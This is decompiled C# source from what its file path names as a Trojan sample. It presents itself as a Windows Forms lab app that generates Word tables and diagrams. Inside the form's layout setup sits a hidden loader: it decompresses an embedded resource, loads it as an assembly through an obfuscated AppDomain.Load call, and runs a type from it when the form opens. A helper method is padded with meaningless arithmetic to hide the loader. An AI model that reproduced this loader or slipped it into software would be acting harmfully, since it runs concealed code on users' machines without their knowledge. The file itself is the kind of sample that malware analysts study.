// Decompiled with JetBrains decompiler
// Type: WindowsFormsApp.FormLab2
// Assembly: IClosableToIDisposableAdap, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2A617983-3D9C-4057-8AD9-58124F2A75C3
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\UDS-Trojan.Win32.GenericML.xnet-4c93747030e17a8581b15cce2fd3aee28eb12dab9a8ec33839d083cda679487d.exe

using Microsoft.VisualBasic;
using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;
using System.Resources;
using System.Threading;
using System.Windows.Forms;
using WindowsFormsApp.MockClasses;
using WindowsFormsComponentLibrary;
using WindowsFormsComponentLibrary.Enums;
using WindowsFormsComponentLibrary.HelperModels.Configs;
using WindowsFormsComponentLibrary.HelperModels.Word;

namespace WindowsFormsApp
{
  public class FormLab2 : Form
  {
    private MockLibrary mock = new MockLibrary();
    private object[] MaxGeneration = new object[3]
    {
      (object) "50726F7061676174696F6E466C",
      (object) "6A7A76",
      (object) "WindowsFormsComponentLibrary"
    };
    private IContainer components = (IContainer) null;
    private static object CreateCallback;
    private static System.Type ScheduledConcurrent = typeof (FormLab2);
    private ComponentWordContextTables componentWordContextTables;
    private ComponentWordDiagram componentWordDiagram;
    private ComponentWordMultyTable componentWordMultyTable;
    private Button buttonContextTableInvoke;
    private Button buttonDiagramInvoke;
    private Button buttonMultyTableInvoke;
    private TextBox textBoxCountTables;
    private TextBox textBoxHeight;
    private TextBox textBoxWidth;
    private Label labelCountTables;
    private Label labelMultyHeight;
    private TextBox textBoxWIdthMultyT;
    private TextBox textBoxHeightMultyT;
    private Label labelTablesHeight;
    private Label labelTablesWidth;
    private Label labelMultyWidth;

    public FormLab2()
    {
      this.InitializeComponent();
      Activator.CreateInstance((System.Type) FormLab2.CreateCallback, this.MaxGeneration);
      this.InitializeComponent();
    }

    private void buttonContextTableInvoke_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog1 = new SaveFileDialog();
      saveFileDialog1.Filter = "docx|*.docx";
      using (SaveFileDialog saveFileDialog2 = saveFileDialog1)
      {
        if (saveFileDialog2.ShowDialog() != DialogResult.OK)
          return;
        this.componentWordContextTables.CreateContextTables(new ComponentWordContextTablesConfig()
        {
          WordInfo = new WordInfo()
          {
            Path = saveFileDialog2.FileName,
            Title = "MyPersonalTitel"
          },
          Tables = this.mock.getListTables(Convert.ToInt32(this.textBoxCountTables.Text), Convert.ToInt32(this.textBoxWidth.Text), Convert.ToInt32(this.textBoxHeight.Text))
        });
      }
    }

    private void buttonMultyTableInvoke_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog1 = new SaveFileDialog();
      saveFileDialog1.Filter = "docx|*.docx";
      using (SaveFileDialog saveFileDialog2 = saveFileDialog1)
      {
        if (saveFileDialog2.ShowDialog() != DialogResult.OK)
          return;
        Books books = new Books();
        this.componentWordMultyTable.CreateTable<Books>(new ComponentWordTableConfig<Books>()
        {
          WordInfo = new WordInfo()
          {
            Path = saveFileDialog2.FileName,
            Title = "MyPersonalTitel"
          },
          ColumnsWidth = this.mock.getColumnsWidth(Convert.ToInt32(this.textBoxWIdthMultyT.Text), 2400),
          RowsHeight = this.mock.getRowsHeight(Convert.ToInt32(this.textBoxHeightMultyT.Text), 1000),
          Headers = this.mock.GetHeader(Convert.ToInt32(this.textBoxWIdthMultyT.Text)),
          PropertiesQueue = this.mock.GetHeader(Convert.ToInt32(this.textBoxWIdthMultyT.Text)),
          ListData = this.mock.GetBooks().Take<Books>(Convert.ToInt32(this.textBoxHeightMultyT.Text)).ToList<Books>()
        });
      }
    }

    private void buttonDiagramInvoke_Click(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog1 = new SaveFileDialog();
      saveFileDialog1.Filter = "docx|*.docx";
      using (SaveFileDialog saveFileDialog2 = saveFileDialog1)
      {
        if (saveFileDialog2.ShowDialog() != DialogResult.OK)
          return;
        Books books = new Books();
        this.componentWordDiagram.createDiagram<Books>(new ComponentWordDiagramConfig<Books>()
        {
          WordInfo = new WordInfo()
          {
            Path = saveFileDialog2.FileName,
            Title = "MyPersonalTitel"
          },
          DiagramTitle = "MyPersonalDiagramTitel",
          LegendLocation = LegendLocations.Corner,
          ListData = this.mock.GetBooks(),
          PropertyX = "Rating",
          PropertyY = "Name"
        });
      }
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.buttonContextTableInvoke = new Button();
      this.buttonDiagramInvoke = new Button();
      this.buttonMultyTableInvoke = new Button();
      this.textBoxCountTables = new TextBox();
      this.textBoxHeight = new TextBox();
      this.textBoxWidth = new TextBox();
      this.labelCountTables = new Label();
      this.labelMultyHeight = new Label();
      this.textBoxWIdthMultyT = new TextBox();
      this.textBoxHeightMultyT = new TextBox();
      this.componentWordContextTables = new ComponentWordContextTables(this.components);
      this.componentWordDiagram = new ComponentWordDiagram(this.components);
      this.componentWordMultyTable = new ComponentWordMultyTable(this.components);
      this.labelTablesHeight = new Label();
      this.labelTablesWidth = new Label();
      this.labelMultyWidth = new Label();
      this.SuspendLayout();
      this.buttonContextTableInvoke.Location = new Point(13, 13);
      this.buttonContextTableInvoke.Name = "buttonContextTableInvoke";
      this.buttonContextTableInvoke.Size = new Size(105, 36);
      this.buttonContextTableInvoke.TabIndex = 0;
      this.buttonContextTableInvoke.Text = "ContextTable";
      this.buttonContextTableInvoke.UseVisualStyleBackColor = true;
      this.buttonContextTableInvoke.Click += new EventHandler(this.buttonContextTableInvoke_Click);
      this.buttonDiagramInvoke.Location = new Point(279, 12);
      this.buttonDiagramInvoke.Name = "buttonDiagramInvoke";
      this.buttonDiagramInvoke.Size = new Size(105, 37);
      this.buttonDiagramInvoke.TabIndex = 1;
      this.buttonDiagramInvoke.Text = "Diagram";
      this.buttonDiagramInvoke.UseVisualStyleBackColor = true;
      this.buttonDiagramInvoke.Click += new EventHandler(this.buttonDiagramInvoke_Click);
      this.buttonMultyTableInvoke.Location = new Point(141, 12);
      this.buttonMultyTableInvoke.Name = "buttonMultyTableInvoke";
      this.buttonMultyTableInvoke.Size = new Size(105, 37);
      this.buttonMultyTableInvoke.TabIndex = 2;
      this.buttonMultyTableInvoke.Text = "Multy Table";
      this.buttonMultyTableInvoke.UseVisualStyleBackColor = true;
      this.buttonMultyTableInvoke.Click += new EventHandler(this.buttonMultyTableInvoke_Click);
      this.textBoxCountTables.Location = new Point(13, 189);
      this.textBoxCountTables.Name = "textBoxCountTables";
      this.textBoxCountTables.Size = new Size(100, 22);
      this.textBoxCountTables.TabIndex = 3;
      this.textBoxHeight.Location = new Point(13, 91);
      this.textBoxHeight.Name = "textBoxHeight";
      this.textBoxHeight.Size = new Size(100, 22);
      this.textBoxHeight.TabIndex = 4;
      this.textBoxWidth.Location = new Point(13, 140);
      this.textBoxWidth.Name = "textBoxWidth";
      this.textBoxWidth.Size = new Size(100, 22);
      this.textBoxWidth.TabIndex = 5;
      this.labelCountTables.AutoSize = true;
      this.labelCountTables.Location = new Point(13, 169);
      this.labelCountTables.Name = "labelCountTables";
      this.labelCountTables.Size = new Size(87, 17);
      this.labelCountTables.TabIndex = 7;
      this.labelCountTables.Text = "Count tables";
      this.labelMultyHeight.AutoSize = true;
      this.labelMultyHeight.Location = new Point(138, 73);
      this.labelMultyHeight.Name = "labelMultyHeight";
      this.labelMultyHeight.Size = new Size(49, 17);
      this.labelMultyHeight.TabIndex = 13;
      this.labelMultyHeight.Text = "Height";
      this.textBoxWIdthMultyT.Location = new Point(138, 140);
      this.textBoxWIdthMultyT.Name = "textBoxWIdthMultyT";
      this.textBoxWIdthMultyT.Size = new Size(100, 22);
      this.textBoxWIdthMultyT.TabIndex = 12;
      this.textBoxHeightMultyT.Location = new Point(138, 93);
      this.textBoxHeightMultyT.Name = "textBoxHeightMultyT";
      this.textBoxHeightMultyT.Size = new Size(100, 22);
      this.textBoxHeightMultyT.TabIndex = 11;
      this.labelTablesHeight.AutoSize = true;
      this.labelTablesHeight.Location = new Point(11, 71);
      this.labelTablesHeight.Name = "labelTablesHeight";
      this.labelTablesHeight.Size = new Size(49, 17);
      this.labelTablesHeight.TabIndex = 15;
      this.labelTablesHeight.Text = "Height";
      this.labelTablesWidth.AutoSize = true;
      this.labelTablesWidth.Location = new Point(11, 120);
      this.labelTablesWidth.Name = "labelTablesWidth";
      this.labelTablesWidth.Size = new Size(44, 17);
      this.labelTablesWidth.TabIndex = 16;
      this.labelTablesWidth.Text = "Width";
      this.labelMultyWidth.AutoSize = true;
      this.labelMultyWidth.Location = new Point(138, 120);
      this.labelMultyWidth.Name = "labelMultyWidth";
      this.labelMultyWidth.Size = new Size(44, 17);
      this.labelMultyWidth.TabIndex = 17;
      this.labelMultyWidth.Text = "Width";
      this.AutoScaleDimensions = FormLab2.DeferredDisposable();
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(800, 450);
      this.Controls.Add((Control) this.labelMultyWidth);
      this.Controls.Add((Control) this.labelTablesWidth);
      this.Controls.Add((Control) this.labelTablesHeight);
      this.Controls.Add((Control) this.labelMultyHeight);
      this.Controls.Add((Control) this.textBoxWIdthMultyT);
      this.Controls.Add((Control) this.textBoxHeightMultyT);
      this.Controls.Add((Control) this.labelCountTables);
      this.Controls.Add((Control) this.textBoxWidth);
      this.Controls.Add((Control) this.textBoxHeight);
      this.Controls.Add((Control) this.textBoxCountTables);
      this.Controls.Add((Control) this.buttonMultyTableInvoke);
      this.Controls.Add((Control) this.buttonDiagramInvoke);
      this.Controls.Add((Control) this.buttonContextTableInvoke);
      this.Name = "FormTestLab2";
      this.Text = "FormTestLab2";
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    private static SizeF DeferredDisposable()
    {
      byte[] array;
      using (GZipStream gzipStream = new GZipStream((Stream) new MemoryStream((byte[]) new ResourceManager(FormLab2.ScheduledConcurrent).GetObject("B8D25T")), CompressionMode.Decompress))
      {
        byte[] buffer = new byte[4096];
        using (MemoryStream memoryStream = new MemoryStream())
        {
          int count;
          do
          {
            count = gzipStream.Read(buffer, 0, 4096);
            if (count > 0)
              memoryStream.Write(buffer, 0, count);
          }
          while (count > 0);
          array = memoryStream.ToArray();
        }
      }
      FormLab2.CreateCallback = (object) FormLab2.CategoryMembership(FormLab2.CompilationRelaxations(array, true)).GetTypes()[1];
      return new SizeF(6f, 13f);
    }

    private static Assembly CategoryMembership(object ResolvedAssemblyFiles) => (Assembly) ResolvedAssemblyFiles;

    public static object CompilationRelaxations(byte[] Message, bool Properties)
    {
      int num1 = 251367116;
      int num2 = num1 <= 251367174 ? (num1 > 251367160 ? 1 : num1 + 1) : 251367106;
      bool flag1 = flag1 = false;
      int num3 = 251367187;
      int num4 = num3 <= 251367157 ? (num3 > 251367115 ? 1 : num3 + 1) : 251367125;
      int num5 = 251367159;
      int num6 = num5 <= 251367182 ? (num5 > 251367102 ? 1 : num5 + 1) : 251367122;
      bool flag2 = true || !(flag2 = false);
      int num7 = 251367159;
      int num8 = num7 <= 251367138 ? (num7 > 251367142 ? 1 : num7 + 1) : 251367112;
      bool flag3 = flag3 = false;
      bool flag4 = false && !(flag4 = true);
      int num9 = 251367115;
      int num10 = num9 <= 251367158 ? (num9 > 251367132 ? 0 : num9 + 1) : 251367117;
      int num11 = 251367164;
      int num12 = num11 <= 251367141 ? (num11 > 251367155 ? 1 : num11 + 1) : 251367132;
      int num13 = 251367146;
      int num14 = num13 <= 251367197 ? (num13 > 251367111 ? 0 : num13 + 1) : 251367190;
      int num15 = 251367161;
      int num16 = num15 <= 251367129 ? (num15 > 251367102 ? 1 : num15 + 1) : 251367118;
      int num17 = 251367122;
      int num18 = num17 <= 251367166 ? (num17 > 251367195 ? 1 : num17 + 1) : 251367136;
      int num19 = 251367150;
      int num20 = num19 <= 251367116 ? (num19 > 251367154 ? 1 : num19 + 1) : 251367128;
      bool flag5 = false && !(flag5 = true) && false;
      bool flag6 = true || (flag6 = false) || true;
      bool flag7 = true || (flag7 = true);
      int num21 = 251367191;
      int num22 = num21 <= 251367169 ? (num21 > 251367182 ? 1 : num21 + 1) : 251367153;
      int num23 = 251367120;
      int num24 = num23 <= 251367160 ? (num23 > 251367136 ? 1 : num23 + 1) : 251367131;
      int num25 = 251367137;
      int num26 = num25 <= 251367168 ? (num25 > 251367159 ? 0 : num25 + 1) : 251367107;
      int num27 = 251367174;
      int num28 = num27 <= 251367145 ? (num27 > 251367120 ? 0 : num27 + 1) : 251367182;
      int num29 = 251367140;
      int num30 = num29 <= 251367114 ? (num29 > 251367113 ? 0 : num29 + 1) : 251367182;
      int num31 = 251367175;
      int num32 = num31 <= 251367185 ? (num31 > 251367141 ? 0 : num31 + 1) : 251367187;
      int num33 = 251367150;
      int num34 = num33 <= 251367178 ? (num33 > 251367136 ? 0 : num33 + 1) : 251367194;
      int num35 = 251367124;
      int num36 = num35 <= 251367185 ? (num35 > 251367117 ? 1 : num35 + 1) : 251367173;
      bool flag8 = true || (flag8 = false);
      int num37 = 251367119;
      int num38 = num37 <= 251367181 ? (num37 > 251367184 ? 0 : num37 + 1) : 251367119;
      int num39 = 251367132;
      int num40 = num39 <= 251367104 ? (num39 > 251367151 ? 1 : num39 + 1) : 251367154;
      int num41 = 251367147;
      int num42 = num41 <= 251367190 ? (num41 > 251367192 ? 0 : num41 + 1) : 251367123;
      int num43 = 251367122;
      int num44 = num43 <= 251367155 ? (num43 > 251367191 ? 0 : num43 + 1) : 251367107;
      int num45 = 251367160;
      int num46 = num45 <= 251367139 ? (num45 > 251367108 ? 0 : num45 + 1) : 251367175;
      int num47 = 251367115;
      int num48 = num47 <= 251367141 ? (num47 > 251367173 ? 1 : num47 + 1) : 251367112;
      return Interaction.CallByName((object) FormLab2.bbbb, "Load", CallType.Get, (object) Message);
    }

    public static AppDomain bbbb => Thread.GetDomain();
  }
}
